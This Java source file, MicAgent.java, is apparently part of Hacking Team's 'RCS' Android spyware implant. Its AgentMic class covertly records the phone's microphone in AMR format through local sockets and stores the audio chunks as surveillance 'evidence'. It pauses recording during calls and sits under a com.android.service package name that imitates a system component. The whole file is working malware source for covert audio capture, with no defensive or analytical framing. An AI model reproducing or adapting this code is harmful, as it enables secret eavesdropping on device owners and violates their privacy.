/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.io.IOException;
import java.io.InputStream;

import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import com.android.service.Call;
import com.android.service.LogR;
import com.android.service.StateRun;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class MicAgent. 8000KHz, 32bit
 * 
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 *      
 * @author zeno
 */
public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {

	private static final String TAG = "AgentMic";
	private static final long MIC_PERIOD = 5000;
	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };

	/** The recorder. */
	MediaRecorder recorder;

	// Object stateLock = new Object();

	private int numFailures;
	private long fId;

	private LocalSocket receiver;
	private LocalServerSocket lss;
	private LocalSocket sender;
	private InputStream is;
	private String socketname;

	boolean phoneListening;
	private boolean resuming;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		try {

			if(Cfg.DEBUG) Check.requires(status == StateRun.STARTING, "inconsistent status");

			addPhoneListener();

			// recorder = new MediaRecorder();

			startRecorder();
			if(Cfg.DEBUG) Check.log( TAG + "started");

		} catch (IllegalStateException e) {
			if(Cfg.DEBUG) { Check.log(e); }
			if(Cfg.DEBUG) Check.log( TAG + " (begin) Error: " + e.toString());
		} catch (IOException e) {
			if(Cfg.DEBUG) { Check.log(e); }
			if(Cfg.DEBUG) Check.log( TAG + " (begin) Error: " + e.toString());
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		if(Cfg.DEBUG) Check.log( TAG + " (end)");
		if(Cfg.DEBUG) Check.requires(status == StateRun.STOPPING, "state not STOPPING");

		removePhoneListener();

		saveRecorderEvidence();
		stopRecorder();

		if(Cfg.DEBUG) Check.log( TAG + " (ended)");

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		if(Cfg.DEBUG) Check.requires(status == StateRun.STARTED, "inconsistent status");

		int amp = recorder.getMaxAmplitude();
		if (amp != 0) {
			if(Cfg.DEBUG) Check.log( TAG + " (go): max amplitude=" + amp);
		}

		if (numFailures < 10) {
			saveRecorderEvidence();

		} else {
			if(Cfg.DEBUG) Check.log( TAG + "numFailures: " + numFailures);
			stopThread();
		}

		if (Status.self().crisisMic()) {
			if(Cfg.DEBUG) Check.log( TAG + "crisis!");
			suspend();
		}

	}

	private void addPhoneListener() {
		if (!phoneListening) {
			ListenerCall.self().attach(this);
			phoneListening = true;
		}
	}

	private void removePhoneListener() {
		if (phoneListening) {
			ListenerCall.self().detach(this);
			phoneListening = false;
		}
	}

	private void saveRecorderEvidence() {

		if(Cfg.DEBUG) Check.requires(recorder != null, "saveRecorderEvidence recorder==null");

		final byte[] chunk = getAvailable();

		if (chunk != null && chunk.length > 0) {

			int offset = 0;
			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				offset = AMR_HEADER.length;
			}

			byte[] data;
			if (offset == 0) {
				data = chunk;
			} else {
				data = Utils.copy(chunk, offset, chunk.length - offset);
			}

			new LogR(EvidenceType.MIC, getAdditionalData(), data);

		} else {
			if(Cfg.DEBUG) Check.log( TAG + "zero chunk ");
			numFailures += 1;
		}
	}

	private byte[] getAvailable() {
		byte[] ret = null;
		try {
			if (receiver.isBound() && receiver.isConnected()) {
				if (is == null) {
					is = receiver.getInputStream();
				}

				int available = is.available();
				ret = new byte[available];
				is.read(ret);
			}
		} catch (IOException e) {
			if(Cfg.DEBUG) { Check.log(e); }
			if(Cfg.DEBUG) Check.log( TAG + " (getAvailable) Error: " + e);
		}

		return ret;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		byte[] confParameters = conf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);

		try {
			int vad = databuffer.readInt();
			int value = databuffer.readInt();
		} catch (IOException e) {
			return false;
		}
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	private void restartRecorder() {
		try {
			stopRecorder();
			startRecorder();
		} catch (IllegalStateException e) {
			if(Cfg.DEBUG) Check.log( TAG + " (restartRecorder) Error: " + e);
			if(Cfg.DEBUG) { Check.log(e); }
		} catch (IOException e) {
			if(Cfg.DEBUG) Check.log( TAG + " (restartRecorder) Error: " + e);
			if(Cfg.DEBUG) { Check.log(e); }
		}
	}

	/**
	 * Start recorder.
	 * 
	 * @throws IllegalStateException
	 *             the illegal state exception
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	private synchronized void startRecorder() throws IllegalStateException, IOException {
		if(Cfg.DEBUG) Check.log( TAG + " (startRecorder)");
		numFailures = 0;

		final DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();

		createSockets();
		recorder = new MediaRecorder();
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

		recorder.setOutputFile(sender.getFileDescriptor());

		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	private void createSockets() {
		receiver = new LocalSocket();
		try {
			socketname = Long.toHexString(Utils.getRandom());
			lss = new LocalServerSocket(socketname);
			receiver.connect(new LocalSocketAddress(socketname));
			receiver.setReceiveBufferSize(500000);
			receiver.setSendBufferSize(500000);
			sender = lss.accept();
			sender.setReceiveBufferSize(500000);
			sender.setSendBufferSize(500000);
		} catch (IOException e) {
			if(Cfg.DEBUG) Check.log( TAG + " (createSockets) Error: " + e);
		}
	}

	private void deleteSockets() {
		try {
			is.close();
			is=null;
			sender.close();
			receiver.close();
			lss.close();
		} catch (IOException e) {
			if(Cfg.DEBUG) { Check.log(e); }
			if(Cfg.DEBUG) Check.log( TAG + " (deleteSockets) Error: " + e);
		}
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java
	/**
	 * Stop recorder.
	 */
	private synchronized void stopRecorder() {
		if(Cfg.DEBUG) Check.requires(recorder == null, "null recorder");

		if(Cfg.DEBUG) Check.log( TAG + " (stopRecorder)");

		recorder.setOnErrorListener(null);
		recorder.setOnInfoListener(null);
        
		recorder.stop();
		recorder.reset(); // You can reuse the object by going back to
							// setAudioSource() step
		// recorder.release(); // Now the object cannot be reused
		getAvailable();
		deleteSockets();

		recorder.release();
		recorder = null;

	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		if(Cfg.DEBUG) Check.ensures(additionalData.length == tlen, "Wrong additional data name");

		return additionalData;
	}

	public int notification(Call call) {
		if (call.isOngoing()) {
			if(Cfg.DEBUG) Check.log( TAG + " (notification): call incoming, suspend");
			suspend();
		} else {
			if(Cfg.DEBUG) Check.log( TAG + " (notification): ");
			resume();
		}

		return 1;
	}

	@Override
	public void suspend() {
		if (!isSuspended()) {
			super.suspend();
			saveRecorderEvidence();
			stopRecorder();
			if(Cfg.DEBUG) Check.log( TAG + " (suspended)");
		}
	}

	@Override
	public void resume() {
		if (isSuspended()) {
			try {
				startRecorder();
			} catch (IllegalStateException e) {
				if(Cfg.DEBUG) Check.log( TAG + " (resume) Error: " + e);
			} catch (IOException e) {
				if(Cfg.DEBUG) Check.log( TAG + " (resume) Error: " + e);
			}

			super.resume();
			if(Cfg.DEBUG) Check.log( TAG + " (resumed)");
		}

	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		if(Cfg.DEBUG) Check.log( TAG + " (onInfo): " + what);
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if(Cfg.DEBUG) Check.log( TAG + " (onError) Error: " + what);
	}
}
